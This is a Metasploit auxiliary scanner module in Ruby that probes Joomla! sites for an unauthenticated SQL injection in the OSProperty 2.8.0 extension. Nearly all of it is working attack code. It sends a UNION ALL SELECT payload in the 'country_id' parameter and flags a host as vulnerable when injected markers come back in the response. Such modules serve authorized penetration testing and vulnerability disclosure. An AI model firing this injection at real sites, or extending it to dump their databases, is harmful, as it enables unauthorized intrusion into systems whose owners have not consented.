##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'OS Solution OSProperty for Joomla! Unauthenticated SQL Injection Scanner',
      'Description' => %q{
      This module will scan for Joomla! instances that are vulnerable to an unauthenticated
      UNION-based SQL injection in version 2.8.0 of OS Solution OSProperty for Joomla! extenstion
      },
      'Author'       =>
        [
          'bperry' #discovery/metasploit module
        ],
      'License'     => 'ExploitHub',
      'References'  =>
        [
          ['EDB', '36862'],
          ['URL', 'https://www.exploit-db.com/exploits/36862/']
        ],
      'DisclosureDate' => 'Apr 29 2015'))

    register_options([
      OptString.new('TARGETURI', [true, 'Target URI of the Joomla! instance', '/'])
    ], self.class)
  end

  def run_host(ip)
    right_marker = Rex::Text.rand_text_alpha(5)
    left_marker = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    vprint_status("#{peer} - Checking host")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => {
        'option' => 'com_osproperty',
        'no_html' => '1',
        'tmpl' => 'component',
        'task' => 'ajax_loadStateInListPage',
        'country_id' => "1' UNION ALL SELECT NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]})#"
      }
    })

    unless res && res.body
      vprint_error("#{peer} - Server did not respond in an expected way")
      return
    end

    result = res.body =~ /#{left_marker}#{flag}#{right_marker}/

    if result
      print_good("#{peer} - Vulnerable to unauthenticated SQL injection within OS Solution OSProperty 2.8.0 for Joomla!")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Unauthenticated error-based SQL injection in OS Solution OSProperty 2.8.0 for Joomla!",
        :refs  => self.references.select { |ref| ref.ctx_val == "36862" }
      })
    end
  end
end
